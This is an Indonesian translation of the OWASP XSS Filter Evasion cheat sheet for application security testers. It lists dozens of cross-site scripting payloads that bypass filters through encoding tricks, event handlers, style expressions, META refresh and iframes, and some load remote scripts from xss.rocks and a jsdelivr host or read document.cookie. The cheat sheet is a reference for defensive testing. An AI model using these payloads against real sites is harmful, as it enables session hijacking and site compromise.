---
sidebar_position: 5
---

# XSS Filter Evasion

## Pengantar XSS Filter Evasion

Artikel ini adalah panduan untuk pengujian Cross Site Scripting (XSS) bagi para profesional keamanan aplikasi. Lembar contekan ini awalnya didasarkan pada Lembar Contekan XSS RSnake yang sebelumnya ada di: `http://ha.ckers.org/xss.html`. Kini, Seri Lembar Contekan OWASP menyediakan versi dokumen yang diperbarui dan dikelola oleh pengguna. Lembar Contekan OWASP pertama, [Pencegahan Cross Site Scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), terinspirasi oleh karya RSnake dan kami berterima kasih kepada RSnake atas inspirasinya!

## Pengujian

Lembar contekan ini menunjukkan bahwa penyaringan input merupakan pertahanan yang tidak lengkap untuk XSS dengan menyediakan serangkaian serangan XSS kepada penguji yang dapat melewati filter pertahanan XSS tertentu.

### Uji XSS Dasar Tanpa Penghindaran Filter

Serangan ini, yang menggunakan injeksi JavaScript XSS normal, berfungsi sebagai dasar untuk lembar contekan (tanda kutip tidak diperlukan di browser modern mana pun sehingga dihilangkan di sini):

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```

### Pencari XSS (Poliglot)

Uji ini memberikan 'muatan XSS uji poliglot' yang dijalankan dalam beberapa konteks, termasuk HTML, string skrip, JavaScript, dan URL:

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

(Berdasarkan [tweet](https://twitter.com/garethheyes/status/997466212190781445) ini oleh [Gareth Heyes](https://twitter.com/garethheyes)).

### Tag A yang Salah Bentuk

Uji coba ini melewati atribut `[href](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href)` untuk menunjukkan serangan XSS menggunakan pengendali peristiwa:

```js
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

Chrome secara otomatis menyisipkan tanda kutip yang hilang untuk Anda. Jika Anda mengalami masalah, coba abaikan tanda kutip tersebut dan Chrome akan menempatkan tanda kutip yang hilang dengan benar di URL atau skrip untuk Anda:

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

(Dikirimkan oleh David Cross, Terverifikasi di Chrome)

### Tag IMG yang Tidak Berformat

Metode XSS ini menggunakan mesin rendering yang dilonggarkan untuk membuat vektor XSS dalam tag IMG (yang perlu dienkapsulasi dalam tanda kutip). Kami yakin pendekatan ini awalnya dimaksudkan untuk memperbaiki pengodean yang ceroboh dan juga akan membuatnya jauh lebih sulit untuk mengurai tag HTML dengan benar:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

(Awalnya ditemukan oleh Begeek, tetapi dibersihkan dan dipersingkat agar dapat berfungsi di semua browser)

### fromCharCode

Jika sistem tidak mengizinkan tanda kutip apa pun, Anda dapat `eval()` `fromCharCode` dalam JavaScript untuk membuat vektor XSS apa pun yang Anda perlukan:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Klik Saya!</a>
```

### Tag SRC Default untuk Melewati Filter yang Memeriksa Domain SRC

Serangan ini akan melewati sebagian besar filter domain SRC. Memasukkan JavaScript ke dalam event handler juga berlaku untuk semua jenis injeksi tag HTML menggunakan elemen seperti Form, Iframe, Input, Embed, dll. Ini juga memungkinkan penggantian setiap event yang relevan untuk jenis tag, seperti `onblur` atau `onclick`, yang menyediakan variasi ekstensif dari injeksi yang tercantum di sini:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

(Dikirimkan oleh David Cross dan diedit oleh Abdullah Hussam)

### Tag SRC Default dengan Membiarkannya Kosong

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### Tag SRC Default dengan Membiarkannya Kosong Sepenuhnya

```html
<IMG onmouseover="alert('xxs')">
```

### Peringatan Kesalahan

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror dan Kode Peringatan JavaScript

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Referensi Karakter HTML Desimal

Karena contoh XSS yang menggunakan direktif `javascript:` di dalam tag `<IMG` tidak berfungsi di Firefox, pendekatan ini menggunakan referensi karakter HTML desimal sebagai solusi:

```html

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Klik Saya!</a>
```

### Referensi Karakter HTML Desimal Tanpa Titik Koma di Akhir

Hal ini sering kali efektif dalam melewati filter XSS yang mencari string `&\#XX;`, karena kebanyakan orang tidak tahu tentang padding - yang dapat digunakan hingga total 7 karakter numerik. Hal ini juga berguna terhadap filter yang mendekode terhadap string seperti `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` yang secara tidak tepat mengasumsikan bahwa titik koma diperlukan untuk mengakhiri string yang dikodekan HTML (Hal ini telah terlihat di alam liar):

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```

### Referensi Karakter HTML Heksadesimal Tanpa Titik Koma di Akhir

Serangan ini juga dapat digunakan terhadap filter untuk string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, karena mengasumsikan bahwa ada karakter numerik setelah simbol pound - yang tidak berlaku untuk karakter HTML heksadesimal:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Klik Saya</a>
```

### Tab Tertanam

Pendekatan ini memecah serangan XSS:

<!-- markdownlint-disable MD010-->
```html
<a href="jav ascript:alert('XSS');">Klik Saya</a>
```
<!-- markdownlint-enable MD010-->

### Tab Terenkripsi Tertanam

Pendekatan ini juga dapat memecah XSS:

```html
<a href="jav&#x09;ascript:alert('XSS');">Klik Saya</a>
```

### Baris Baru Tertanam untuk Memecah XSS

Meskipun beberapa pembela mengklaim bahwa salah satu karakter 09-13 (desimal) akan berfungsi untuk serangan ini, ini tidak benar. Hanya 09 (tab horizontal), 10 (baris baru), dan 13 (carriage return) yang berfungsi. Periksa [tabel ASCII](https://man7.org/linux/man-pages/man7/ascii.7.html) untuk referensi. Empat contoh serangan XSS berikutnya mengilustrasikan vektor ini:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Klik Saya</a>
```

#### Contoh 1: Pisahkan Serangan XSS dengan Embedded Carriage Return

(Catatan: dengan contoh di atas saya membuat string ini lebih panjang dari yang seharusnya karena angka nol dapat dihilangkan. Sering kali saya melihat filter yang menganggap enkode hex dan dec harus terdiri dari dua atau tiga karakter. Aturan sebenarnya adalah 1-7 karakter.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Klik Saya</a>
```

#### Contoh 2: Pisahkan Direktif JavaScript dengan Null

Karakter null juga berfungsi sebagai vektor XSS tetapi tidak seperti di atas, Anda perlu menyuntikkannya secara langsung menggunakan sesuatu seperti Burp Proxy atau menggunakan `%00` di string URL atau jika Anda ingin menulis alat injeksi Anda sendiri, Anda dapat menggunakan vim (`^V^@` akan menghasilkan null) atau program berikut untuk membuatnya menjadi file teks. Karakter null `%00` jauh lebih berguna dan membantu saya melewati filter dunia nyata tertentu dengan variasi pada contoh ini:

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

#### Contoh 3: Spasi dan Karakter Meta Sebelum JavaScript dalam Gambar untuk XSS

Ini berguna jika pencocokan pola filter tidak memperhitungkan spasi dalam kata `javascript:`, yang benar karena itu tidak akan ditampilkan, tetapi membuat asumsi yang salah bahwa Anda tidak dapat memiliki spasi antara tanda kutip dan kata kunci `javascript:`. Realitas yang sebenarnya adalah Anda dapat memiliki karakter apa pun dari 1-32 dalam desimal:

```html
<a href=" &#14; javascript:alert('XSS');">Klik Saya</a>
```

#### Contoh 4: XSS Non-alfa-non-digit

Pengurai HTML Firefox menganggap non-alfa-non-digit tidak valid setelah kata kunci HTML dan karenanya menganggapnya sebagai spasi atau token yang tidak valid setelah tag HTML. Masalahnya adalah beberapa filter XSS menganggap bahwa tag yang mereka cari dipecah oleh spasi. Misalnya `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

Berdasarkan ide yang sama seperti di atas, namun, diperluas, menggunakan fuzzer Rsnake. Mesin rendering Gecko memungkinkan karakter apa pun selain huruf, angka, atau karakter enkapsulasi (seperti tanda kutip, tanda kurung siku, dll.) di antara pengendali peristiwa dan tanda sama dengan, sehingga lebih mudah untuk melewati blok skrip lintas situs. Perhatikan bahwa ini juga berlaku untuk karakter aksen grave seperti yang terlihat di sini:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit mencatat bahwa ada perilaku yang sedikit berbeda antara mesin render Trident (IE) dan Gecko (Firefox) yang hanya mengizinkan garis miring antara tag dan parameter tanpa spasi. Ini dapat berguna dalam serangan jika sistem tidak mengizinkan spasi:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### Tanda Kurung Buka Asing

Vektor XSS ini dapat mengalahkan mesin deteksi tertentu yang bekerja dengan memeriksa pasangan tanda kurung sudut buka dan tutup yang cocok, lalu membandingkan tag di dalamnya, alih-alih algoritma yang lebih efisien seperti [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) yang mencari kecocokan string lengkap dari tanda kurung sudut buka dan tag terkait (tentu saja setelah pengaburan). Tanda garis miring ganda mengomentari tanda kurung asing di akhir untuk menghilangkan kesalahan JavaScript:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

(Dikirimkan oleh Franz Sedlmaier)

### Tidak Ada Tag Skrip Penutup

Dengan Firefox, Anda sebenarnya tidak memerlukan bagian `\></SCRIPT>` dari vektor XSS ini, karena Firefox menganggapnya aman untuk menutup tag HTML dan menambahkan tag penutup untuk Anda. Tidak seperti serangan berikutnya, yang tidak memengaruhi Firefox, metode ini tidak memerlukan HTML tambahan di bawahnya. Anda dapat menambahkan tanda kutip jika perlu, tetapi biasanya tidak diperlukan:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### Resolusi Protokol dalam Tag Skrip

Varian khusus ini sebagian didasarkan pada bypass resolusi protokol Ozh di bawah ini, dan berfungsi di IE dan Edge dalam mode kompatibilitas. Namun, ini sangat berguna jika ruang menjadi masalah, dan tentu saja, semakin pendek domain Anda, semakin baik. `.j` valid, terlepas dari jenis penyandian karena peramban mengenalinya dalam konteks tag SCRIPT:

```html
<SCRIPT SRC=//xss.rocks/.j>
```

(Dikirimkan oleh Łukasz Pilorz)

### Vektor XSS HTML/JavaScript Setengah Terbuka

Tidak seperti Firefox, mesin perender IE (Trident) tidak menambahkan data tambahan ke halaman Anda, tetapi mengizinkan direktif `javascript:` dalam gambar. Ini berguna sebagai vektor karena tidak memerlukan tanda kurung siku yang rapat. Ini mengasumsikan ada tag HTML di bawah tempat Anda menyuntikkan vektor XSS ini. Meskipun tidak ada tag `\>` yang rapat, tag di bawahnya akan menutupnya. Catatan: ini mengacaukan HTML, tergantung pada HTML apa yang ada di bawahnya. Ia mengatasi regex sistem deteksi intrusi jaringan (NIDS) berikut: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` karena tidak memerlukan akhiran `\>`. Sebagai catatan tambahan, ini juga efektif terhadap filter XSS dunia nyata yang menggunakan tag `<IFRAME` terbuka alih-alih tag `<IMG`.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

### Melarikan Diri dari Karakter Escape JavaScript

Jika sebuah aplikasi ditulis untuk menampilkan beberapa informasi pengguna di dalam JavaScript (seperti berikut: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) dan Anda ingin memasukkan JavaScript Anda sendiri ke dalamnya tetapi aplikasi sisi server melakukan escape pada tanda kutip tertentu, Anda dapat menghindarinya dengan melakukan escape pada karakter escape-nya. Ketika kode ini disuntikkan, kode ini akan membaca `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>` yang akhirnya membatalkan tanda kutip ganda dan menyebabkan vektor XSS aktif. Pencari XSS menggunakan metode ini:

```js
\";alert('XSS');//
```

Alternatifnya, jika JSON atau JavaScript yang benar telah diterapkan pada data yang disematkan tetapi bukan penyandian HTML, adalah menyelesaikan blok skrip dan memulai sendiri:

```js
</script><script>alert('XSS');</script>
```

### Akhiri Tag Judul

Ini adalah vektor XSS sederhana yang menutup tag `<TITLE>`, yang dapat merangkum serangan skrip lintas situs yang berbahaya:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

#### INPUT Gambar

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY Gambar

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

### Gambar bergaya daftar

Serangan misterius ini berfokus pada penyematan gambar untuk daftar berpoin. Serangan ini hanya akan berfungsi di mesin rendering IE karena adanya perintah JavaScript. Bukan vektor XSS yang sangat berguna:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### VBscript dalam Gambar

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### Tag Objek SVG

```js
<svg/onload=alert('XSS')>
```

### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

### Tag BODY

Serangan ini tidak memerlukan penggunaan varian `javascript:` atau `<SCRIPT...` untuk melakukan serangan XSS. Dan Crowley telah mencatat bahwa Anda dapat meletakkan spasi sebelum tanda sama dengan (`onload=` != `onload =`):

```html
<BODY ONLOAD=alert('XSS')>
```

#### Serangan Menggunakan Penangan Peristiwa

Serangan dengan tag BODY dapat dimodifikasi untuk digunakan dalam serangan XSS yang serupa dengan yang di atas (ini adalah daftar terlengkap di internet, pada saat penulisan ini). Terima kasih kepada Rene Ledosquet untuk pembaruan HTML+TIME.

[Referensi Web Dottoro](http://help.dottoro.com/) juga memiliki [daftar peristiwa dalam JavaScript](http://help.dottoro.com/ljfvvdnm.php) yang bagus.

- `onAbort()` (ketika pengguna membatalkan pemuatan gambar)
- `onActivate()` (ketika objek ditetapkan sebagai elemen aktif)
- `onAfterPrint()` (diaktifkan setelah pengguna mencetak atau melihat pratinjau pekerjaan cetak)
- `onAfterUpdate()` (diaktifkan pada objek data setelah memperbarui data di objek sumber)
- `onBeforeActivate()` (diaktifkan sebelum objek ditetapkan sebagai elemen aktif)
- `onBeforeCopy()` (penyerang mengeksekusi string serangan tepat sebelum pilihan disalin ke clipboard - penyerang dapat melakukan ini dengan fungsi `execCommand("Copy")`)
- `onBeforeCut()` (penyerang mengeksekusi string serangan tepat sebelum pilihan dipotong)
- `onBeforeDeactivate()` (diaktifkan tepat setelah activeElement diubah dari objek saat ini)
- `onBeforeEditFocus()` (Diaktifkan sebelum objek yang terdapat dalam objek yang dapat diedit elemen memasuki status yang diaktifkan UI atau saat objek kontainer yang dapat diedit dipilih sebagai kontrol)
- `onBeforePaste()` (pengguna perlu ditipu agar menempel atau dipaksa melakukannya menggunakan fungsi `execCommand("Paste")`)
- `onBeforePrint()` (pengguna perlu ditipu agar mencetak atau penyerang dapat menggunakan fungsi `print()` atau `execCommand("Print")`). - `onBeforeUnload()` (pengguna perlu ditipu agar menutup browser - penyerang tidak dapat membongkar jendela kecuali jendela tersebut dibuat dari induknya)
- `onBeforeUpdate()` (diaktifkan pada objek data sebelum memperbarui data di objek sumber)
- `onBegin()` (peristiwa onbegin langsung aktif saat garis waktu elemen dimulai)
- `onBlur()` (dalam kasus ketika popup lain dimuat dan jendela kehilangan fokus)
- `onBounce()` (aktif saat properti perilaku objek marquee diatur ke "alternate" dan konten marquee mencapai satu sisi jendela)
- `onCellChange()` (aktif saat data berubah di penyedia data)
- `onChange()` (bidang select, text, atau TEXTAREA kehilangan fokus dan nilainya telah dimodifikasi)
- `onClick()` (seseorang mengklik formulir)
- `onContextMenu()` (pengguna perlu mengklik kanan pada area serangan)
- `onControlSelect()` (diaktifkan saat pengguna akan membuat pilihan kontrol pada objek)
- `onCopy()` (pengguna perlu menyalin sesuatu atau dapat dieksploitasi menggunakan perintah `execCommand("Copy")`)
- `onCut()` (pengguna perlu menyalin sesuatu atau dapat dieksploitasi menggunakan perintah `execCommand("Cut")`)
- `onDataAvailable()` (pengguna perlu mengubah data dalam suatu elemen, atau penyerang dapat melakukan fungsi yang sama)
- `onDataSetChanged()` (diaktifkan saat kumpulan data yang diekspos oleh objek sumber data berubah)
- `onDataSetComplete()` (diaktifkan untuk menunjukkan bahwa semua data tersedia dari objek sumber data)
- `onDblClick()` (pengguna mengklik dua kali elemen formulir atau tautan)
- `onDeactivate()` (diaktifkan saat activeElement diubah dari objek saat ini ke objek lain dalam dokumen induk)
- `onDrag()` (mengharuskan pengguna menyeret objek)
- `onDragEnd()` (mengharuskan pengguna menyeret objek)
- `onDragLeave()` (mengharuskan pengguna menyeret objek dari lokasi yang valid)
- `onDragEnter()` (mengharuskan pengguna menyeret objek ke lokasi yang valid)
- `onDragOver()` (mengharuskan pengguna menyeret objek ke lokasi yang valid)
- `onDragDrop()` (pengguna menjatuhkan objek (misalnya file) ke jendela browser)
- `onDragStart()` (terjadi saat pengguna memulai operasi drag)
- `onDrop()` (pengguna menjatuhkan objek (misalnya file) ke jendela browser)
- `onEnd()` (peristiwa onEnd diaktifkan saat timeline berakhir.
- `onError()` (memuat dokumen atau gambar menyebabkan kesalahan)
- `onErrorUpdate()` (diaktifkan pada objek terikat data saat terjadi kesalahan saat memperbarui data terkait di objek sumber data)
- `onFilterChange()` (diaktifkan saat filter visual menyelesaikan perubahan status)
- `onFinish()` (penyerang dapat membuat eksploitasi saat marquee selesai melakukan looping)
- `onFocus()` (penyerang mengeksekusi string serangan saat jendela mendapat fokus)
- `onFocusIn()` (penyerang mengeksekusi string serangan saat jendela mendapat fokus)
- `onFocusOut()` (penyerang mengeksekusi string serangan saat jendela kehilangan fokus)
- `onHashChange()` (diaktifkan saat bagian pengidentifikasi fragmen dari alamat dokumen saat ini berubah)
- `onHelp()` (penyerang mengeksekusi string serangan saat pengguna menekan F1 saat jendela dalam fokus)
- `onInput()` (konten teks dari suatu elemen diubah melalui antarmuka pengguna)
- `onKeyDown()` (pengguna menekan tombol)
- `onKeyPress()` (pengguna menekan atau menahan tombol)
- `onKeyUp()` (pengguna melepaskan tombol)
- `onLayoutComplete()` (pengguna harus mencetak atau pratinjau cetak)
- `onLoad()` (penyerang mengeksekusi string serangan setelah jendela dimuat)
- `onLoseCapture()` (dapat dimanfaatkan oleh metode `releaseCapture()`)
- `onMediaComplete()` (Saat file media streaming digunakan, peristiwa ini dapat aktif sebelum file mulai diputar)
- `onMediaError()` (Pengguna membuka halaman di browser yang berisi file media, dan peristiwa tersebut aktif ketika ada masalah)
- `onMessage()` (aktif ketika dokumen menerima pesan)
- `onMouseDown()` (penyerang perlu membuat pengguna mengklik gambar)
- `onMouseEnter()` (kursor bergerak di atas objek atau area)
- `onMouseLeave()` (penyerang perlu membuat pengguna mengarahkan kursor ke gambar atau tabel lalu mematikannya lagi)
- `onMouseMove()` (penyerang perlu membuat pengguna mengarahkan kursor ke gambar atau tabel)
- `onMouseOut()` (penyerang perlu membuat pengguna mengarahkan kursor ke gambar atau tabel lalu mematikannya lagi)
- `onMouseOver()` (kursor bergerak di atas objek atau area)
- `onMouseUp()` (penyerang perlu membuat pengguna mengklik gambar)
- `onMouseWheel()` (penyerang perlu meminta pengguna untuk menggunakan roda tetikus mereka)
- `onMove()` (pengguna atau penyerang akan memindahkan halaman)
- `onMoveEnd()` (pengguna atau penyerang akan memindahkan halaman)
- `onMoveStart()` (pengguna atau penyerang akan memindahkan halaman)
- `onOffline()` (terjadi jika peramban bekerja dalam mode daring dan mulai bekerja secara luring)
- `onOnline()` (terjadi jika peramban bekerja dalam mode luring dan mulai bekerja secara daring)
- `onOutOfSync()` (mengganggu kemampuan elemen untuk memutar medianya sebagaimana yang ditentukan oleh garis waktu)
- `onPaste()` (pengguna perlu menempel atau penyerang dapat menggunakan fungsi `execCommand("Paste")`)
- `onPause()` (peristiwa onpause diaktifkan pada setiap elemen yang aktif saat garis waktu berhenti, termasuk elemen body)
- `onPopState()` (diaktifkan saat pengguna menelusuri riwayat sesi)
- `onPropertyChange()` (pengguna atau penyerang perlu mengubah properti elemen)
- `onReadyStateChange()` (pengguna atau penyerang perlu mengubah properti elemen)
- `onRedo()` (pengguna melanjutkan ke riwayat transaksi undo)
- `onRepeat()` (peristiwa diaktifkan sekali untuk setiap pengulangan alur waktu, tidak termasuk siklus penuh pertama)
- `onReset()` (pengguna atau penyerang menyetel ulang formulir)
- `onResize()` (pengguna akan mengubah ukuran jendela; penyerang dapat melakukan inisialisasi otomatis dengan sesuatu seperti: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeEnd()` (pengguna akan mengubah ukuran jendela; penyerang dapat melakukan inisialisasi otomatis dengan sesuatu seperti: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeStart()` (pengguna akan mengubah ukuran jendela; penyerang dapat melakukan inisialisasi otomatis dengan sesuatu seperti: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResume()` (peristiwa onresume diaktifkan pada setiap elemen yang menjadi aktif saat garis waktu dilanjutkan, termasuk elemen body)
- `onReverse()` (jika elemen memiliki repeatCount lebih besar dari satu, peristiwa ini diaktifkan setiap kali garis waktu mulai diputar mundur)
- `onRowsEnter()` (pengguna atau penyerang perlu mengubah baris dalam sumber data)
- `onRowExit()` (pengguna atau penyerang perlu mengubah baris dalam sumber data)
- `onRowDelete()` (pengguna atau penyerang perlu menghapus baris dalam sumber data)
- `onRowInserted()` (pengguna atau penyerang perlu menyisipkan baris dalam sumber data)
- `onScroll()` (pengguna perlu menggulir, atau penyerang dapat menggunakan fungsi `scrollBy()`)
- `onSeek()` (peristiwa `onReverse` dipicu saat garis waktu diatur untuk diputar ke arah mana pun selain maju)
- `onSelect()` (pengguna perlu memilih beberapa teks - penyerang dapat menginisialisasi otomatis dengan sesuatu seperti: `window.document.execCommand("SelectAll");`)
- `onSelectionChange()` (pengguna perlu memilih beberapa teks - penyerang dapat melakukan inisialisasi otomatis dengan sesuatu seperti: `window.document.execCommand("SelectAll");`)
- `onSelectStart()` (pengguna perlu memilih beberapa teks - penyerang dapat melakukan inisialisasi otomatis dengan sesuatu seperti: `window.document.execCommand("SelectAll");`)
- `onStart()` (diaktifkan di awal setiap loop marquee)
- `onStop()` (pengguna perlu menekan tombol berhenti atau meninggalkan halaman web)
- `onStorage()` (area penyimpanan berubah)
- `onSyncRestored()` (pengguna menghentikan kemampuan elemen untuk memutar medianya sebagaimana ditentukan oleh timeline untuk diaktifkan)
- `onSubmit()` (memerlukan penyerang atau pengguna mengirimkan formulir)
- `onTimeError()` (pengguna atau penyerang menyetel properti waktu, seperti dur, ke nilai yang tidak valid)
- `onTrackChange()` (pengguna atau penyerang mengubah trek dalam daftar putar)
- `onUndo()` (pengguna kembali ke riwayat transaksi batal)
- `onUnload()` (saat pengguna mengklik tautan atau menekan tombol kembali atau penyerang memaksa klik)
- `onURLFlip()` (peristiwa ini dipicu saat file Advanced Streaming Format (ASF), diputar oleh tag media HTML+TIME (Timed Interactive Multimedia Extensions), memproses perintah skrip yang disematkan dalam file ASF)
- `seekSegmentTime()` (ini adalah metode yang menemukan titik yang ditentukan pada garis waktu segmen elemen dan mulai memutar dari titik tersebut. Segmen tersebut terdiri dari satu pengulangan alur waktu termasuk pemutaran terbalik menggunakan atribut AUTOREVERSE.)

#### BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

#### & JavaScript termasuk

```html
<BR SIZE="&{alert('XSS')}">
```

#### Lembar GAYA

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### Lembar gaya jarak jauh

Dengan menggunakan sesuatu yang sederhana seperti lembar gaya jarak jauh, Anda dapat menyertakan XSS karena parameter gaya dapat didefinisikan ulang menggunakan ekspresi yang disematkan. Ini hanya berfungsi di IE. Perhatikan bahwa tidak ada apa pun di halaman yang menunjukkan bahwa ada JavaScript yang disertakan. Catatan: Dengan semua contoh lembar gaya jarak jauh ini, mereka menggunakan tag body, jadi tidak akan berfungsi kecuali ada beberapa konten di halaman selain vektor itu sendiri, jadi Anda perlu menambahkan satu huruf ke halaman agar berfungsi jika halaman tersebut kosong:

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

#### Lembar gaya jarak jauh bagian 2

Ini berfungsi sama seperti di atas, tetapi menggunakan tag `<STYLE>` alih-alih tag `<LINK>`). Sedikit variasi pada vektor ini digunakan
untuk meretas Google Desktop. Sebagai catatan tambahan, Anda dapat menghapus tag akhir `</STYLE>` jika ada HTML tepat setelah vektor untuk menutupnya. Ini berguna jika Anda tidak dapat menggunakan tanda sama dengan atau garis miring dalam serangan skrip lintas situs, yang telah muncul setidaknya sekali di dunia nyata:

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

#### Lembar gaya jarak jauh bagian 3

Ini hanya berfungsi di mesin render Gecko dan berfungsi dengan mengikat file XUL ke halaman induk.

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

### Tag STYLE yang Memisahkan JavaScript untuk XSS

XSS ini terkadang mengirim IE ke dalam lingkaran peringatan yang tak terbatas:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### Atribut STYLE yang Memisahkan Ekspresi

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

(Dibuat oleh Roman Ivanov)

### IMG STYLE dengan Ekspresi

Ini benar-benar gabungan dari dua vektor XSS terakhir, tetapi ini benar-benar menunjukkan betapa sulitnya STYLE tag dapat diurai secara terpisah. Ini dapat membuat IE mengalami pengulangan:

```html
exp/*<A STYLE='no\xss:noxss("*//*"); xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### Tag GAYA menggunakan Gambar latar

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### Tag GAYA menggunakan Latar

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

### HTML Anonim dengan Atribut GAYA

Mesin rendering IE tidak terlalu peduli apakah tag HTML yang Anda buat ada atau tidak, selama tag tersebut dimulai dengan tanda kurung siku terbuka dan huruf:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

### File htc Lokal

Ini sedikit berbeda dari dua vektor XSS terakhir karena menggunakan file .htc yang harus berada di server yang sama dengan vektor XSS. File contoh ini bekerja dengan menarik JavaScript dan menjalankannya sebagai bagian dari atribut style:

```html
<XSS STYLE="behavior: url(xss.htc);">
```

### Pengodean US-ASCII

Serangan ini menggunakan pengodean ASCII yang salah bentuk dengan 7 bit, bukan 8. Metode XSS ini dapat melewati banyak filter konten, tetapi hanya berfungsi jika host mentransmisikan dalam pengodean US-ASCII atau jika Anda mengatur pengodean sendiri. Ini lebih berguna terhadap penghindaran XSS firewall aplikasi web (WAF) daripada penghindaran filter sisi server. Apache Tomcat adalah satu-satunya server yang diketahui yang secara default masih mentransmisikan dalam penyandian US-ASCII.

```js
¼script¾alert(¢XSS¢)¼/script¾
```

### META

Hal aneh tentang meta refresh adalah ia tidak mengirim referrer di header - jadi ia dapat digunakan untuk jenis serangan tertentu di mana Anda perlu menyingkirkan URL rujukan:

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

#### META menggunakan Data

Skema URL Direktif. Metode serangan ini bagus karena ia juga tidak memiliki apa pun yang terlihat yang memiliki kata SCRIPT atau direktif JavaScript di dalamnya, karena ia menggunakan penyandian base64. Silakan lihat [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) untuk keterangan lebih lanjut.

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

#### META dengan Parameter URL Tambahan

Jika situs web target mencoba melihat apakah URL berisi `<http://>;` di awal, Anda dapat menghindari aturan filter ini dengan teknik berikut:

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

(Dikirimkan oleh Moritz Naumann)

### IFRAME

Jika iFrame diizinkan, ada banyak masalah XSS lainnya juga:

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

### IFRAME Berbasis Peristiwa

IFrame dan sebagian besar elemen lainnya dapat menggunakan kekacauan berbasis peristiwa seperti berikut:

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

(Dikirim oleh: David Cross)

### FRAME

Frame memiliki jenis masalah XSS yang sama seperti iFrame

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```

